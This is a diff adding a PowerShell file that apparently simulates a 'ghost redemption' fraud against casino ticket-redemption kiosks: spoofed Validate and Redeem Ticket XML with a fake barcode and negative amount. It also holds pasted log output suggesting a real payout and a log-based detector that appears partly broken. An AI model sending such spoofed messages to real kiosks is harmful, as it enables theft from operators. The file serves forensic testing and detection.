@@ -1,0 +1,188 @@
+# Replay Script - RedHat Ghost Redemption Exploit Simulation
+# Author: "Elyon Shade" (Red Hat Sim)
+# Usage: Test forensics and alerting around offline JackpotService anomalies
+
+function Write-Log {
+    param(
+        [string]$Level,
+        [string]$Message
+    )
+    $timestamp = (Get-Date -Format "dddd, dd MMMM yyyy hh:mm:ss tt")
+    Write-Output "$timestamp [$Level] $Message"
+}
+
+# Simulated exploit barcode
+$fakeBarcode = "9999999999999999"
+$amount = -19.99
+$transId = "99999999"
+$unitId = "SleepyPC"
+
+# STEP 1: JackpotService goes offline
+Write-Log "ERR" "KonamiJackpotService No connection could be made because the target machine actively refused it. (0.0.0)"
+
+Start-Sleep -Seconds 2
+
+# STEP 2: Spoof ValidateTicket request
+Write-Log "INF" "ValidateTicket: {`"Barcode`":`"$fakeBarcode`"}"
+Start-Sleep -Milliseconds 500
+
+$validateRequest = @"
+<?xml version="1.0" encoding="utf-8"?>
+<Message Command="Validate Ticket" UnitID="$unitId" Version="1">
+  <Barcode>$fakeBarcode</Barcode>
+</Message>
+"@
+Write-Log "INF" "Request validate ticket: $validateRequest"
+Start-Sleep -Seconds 1
+
+# STEP 3: Simulate backend accepting the spoofed ticket
+$validateResponse = @"
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<Message Command="Validate Ticket" UnitID="$unitId" Version="1">
+  <Status>GOOD</Status>
+  <TimeDate>$(Get-Date -Format "MM/dd/yyyy hh:mm:ss tt")</TimeDate>
+  <Error/>
+  <Barcode>$fakeBarcode</Barcode>
+  <Amount>$amount</Amount>
+  <Location/>
+  <TransId>$transId</TransId>
+  <PlayerName>Unknown, Unknown Unknown</PlayerName>
+  <BonusCode/>
+</Message>
+"@
+Write-Log "INF" "Received validate ticket: $validateResponse"
+
+Start-Sleep -Seconds 2
+
+# STEP 4: Spoof RedeemTicket request
+$redeemRequest = @"
+<?xml version="1.0" encoding="utf-8"?>
+<Message Command="Redeem Ticket" UnitID="$unitId" Version="1">
+  <Amount>$amount</Amount>
+  <Barcode>$fakeBarcode</Barcode>
+</Message>
+"@
+Write-Log "INF" "Request redeem ticket: $redeemRequest"
+
+Start-Sleep -Seconds 1
+
+# STEP 5: Simulate successful redemption response
+$redeemResponse = @"
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<Message Command="Redeem Ticket" UnitID="$unitId" Version="1">
+  <Status>GOOD</Status>
+  <TimeDate>$(Get-Date -Format "MM/dd/yyyy hh:mm:ss tt")</TimeDate>
+  <Error/>
+  <Barcode>$fakeBarcode</Barcode>
+  <Amount>$amount</Amount>
+  <Location/>
+  <TransId>$transId</TransId>
+  <PlayerName>Unknown, Unknown Unknown</PlayerName>
+  <BonusCode/>
+</Message>
+"@
+Write-Log "INF" "Received redeem ticket: $redeemResponse"
+
+Start-Sleep -Seconds 1
+Write-Log "INF" "Replay complete. Ghost Redemption simulated."
+
+💰 Redemption Triggered:
+xml
+CopyEdit
+<Message Command="Redeem Ticket" UnitID="DitronicsD3" Version="1">
+  <Amount>-19.99</Amount>
+  <Barcode>9999999999999999</Barcode>
+</Message>
+
+🖥️ Observed Log Output:
+xml
+CopyEdit
+Friday, 04 April 2025 05:37:36 PM [INF] Request redeem ticket: <?xml version="1.0" encoding="utf-8"?><Message Command="Redeem Ticket" UnitID="SleepyPC" Version="1"><Amount>-19.99</Amount><Barcode>9999999999999999</Barcode></Message>
+Friday, 04 April 2025 05:37:38 PM [INF] Received redeem ticket: <?xml version="1.0" encoding="UTF-8" standalone="no"?><Message Command="Redeem Ticket" UnitID="DitronicsD3" Version="1"><Status>GOOD</Status><TimeDate>04/04/2025 05:37:37 PM</TimeDate><Error/><Barcode>9999999999999999</Barcode><Amount>427.7</Amount><Location/><TransId>99999999</TransId><PlayerName>Unknown, Unknown Unknown</PlayerName><BonusCode/></Message>
+
+# GhostSnare.ps1 - Red Hat Operator Detection
+# Detects ghost-style ticket redemptions via pattern anomalies
+
+$logPath = "C:\Logs\RedemptionLog.log"  # <- Set to your real log path
+$ghostThresholdSeconds = 5              # Suspicious if Validate→Redeem < 5 seconds
+$unitAbuseThreshold = 5                 # Too many suspicious redeems per UnitID
+$ghostBarcodes = @{}
+$unitSuspicion = @{}
+$ghostHits = @()
+
+function Parse-TicketLog {
+    param ($lines)
+
+    foreach ($line in $lines) {
+        if ($line -match 'ValidateTicket.*Barcode":"(?<barcode>\d+)"') {
+            $barcode = $matches['barcode']
+            $validateTime = [datetime]$line.Substring(0, 32)
+            $ghostBarcodes[$barcode] = @{
+                ValidateTime = $validateTime
+                UnitID = ''
+                Redeemed = $false
+                PlayerName = ''
+                RedeemTime = $null
+            }
+        }
+
+        if ($line -match 'Request validate ticket.*<Message.*UnitID="(?<unit>.*?)".*?<Barcode>(?<barcode>\d+)</Barcode>') {
+            if ($ghostBarcodes[$matches['barcode']]) {
+                $ghostBarcodes[$matches['barcode']].UnitID = $matches['unit']
+            }
+        }
+
+        if ($line -match 'Received redeem ticket.*<Barcode>(?<barcode>\d+)</Barcode>.*<PlayerName>(?<name>.*?)</PlayerName>') {
+            $barcode = $matches['barcode']
+            $name = $matches['name']
+            $redeemTime = [datetime]$line.Substring(0, 32)
+
+            if ($ghostBarcodes[$barcode]) {
+                $ghostBarcodes[$barcode].Redeemed = $true
+                $ghostBarcodes[$barcode].RedeemTime = $redeemTime
+                $ghostBarcodes[$barcode].PlayerName = $name
+            }
+        }
+
+        # Jackpot service errors
+        if ($line -match 'KonamiJackpotService.*actively refused') {
+            Write-Warning "⚠️ Jackpot Service Offline Detected @ $($line.Substring(0, 32))"
+        }
+    }
+}
+
+function Analyze-Anomalies {
+    foreach ($barcode in $ghostBarcodes.Keys) {
+        $entry = $ghostBarcodes[$barcode]
+        if (-not $entry.Redeemed) { continue }
+
+        $delta = ($entry.RedeemTime - $entry.ValidateTime).TotalSeconds
+        $isGhost = ($entry.PlayerName -eq "Unknown, Unknown Unknown") -and ($delta -le $ghostThresholdSeconds)
+
+        if ($isGhost) {
+            $ghostHits += $entry
+            Write-Host "`n👻 Suspected Ghost Redemption:"
+            Write-Host "  ▪ Barcode: $barcode"
+            Write-Host "  ▪ UnitID : $($entry.UnitID)"
+            Write-Host "  ▪ Time   : $($entry.ValidateTime.ToShortTimeString()) → $($entry.RedeemTime.ToShortTimeString()) ($delta sec)"
+            Write-Host "  ▪ Player : $($entry.PlayerName)`n"
+
+            # Track abuse per kiosk
+            $unitSuspicion[$entry.UnitID] += 1
+        }
+    }
+
+    # Detect abused kiosks
+    foreach ($unit in $unitSuspicion.Keys) {
+        if ($unitSuspicion[$unit] -gt $unitAbuseThreshold) {
+            Write-Host "🔥 ALERT: UnitID '$unit' has $($unitSuspicion[$unit]) ghost redemptions! LOCKDOWN ADVISED!"
+        }
+    }
+}
+
+# Run it
+$logLines = Get-Content $logPath -Tail 2000
+Parse-TicketLog -lines $logLines
+Analyze-Anomalies
+
+
